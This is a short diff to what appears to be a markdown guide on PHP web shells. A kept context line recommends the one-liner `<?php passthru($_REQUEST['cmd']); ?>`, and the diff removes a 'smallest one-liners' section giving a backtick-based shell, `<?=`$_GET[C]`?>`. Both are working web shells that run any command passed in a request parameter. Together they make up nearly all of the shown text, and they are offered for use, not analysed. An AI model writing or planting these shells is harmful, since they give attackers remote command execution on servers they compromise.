@@ -28,10 +28,7 @@ For basic features, I recommend one-liners like :
 
 `<?php passthru($_REQUEST['cmd']); ?>`
 
-smallest one-liners
-===
-`` is  backtick character anything b/w this excute directly many developer unaware about this
-`<?=`$_GET[C]`?>`
+
 
 
 Cite:
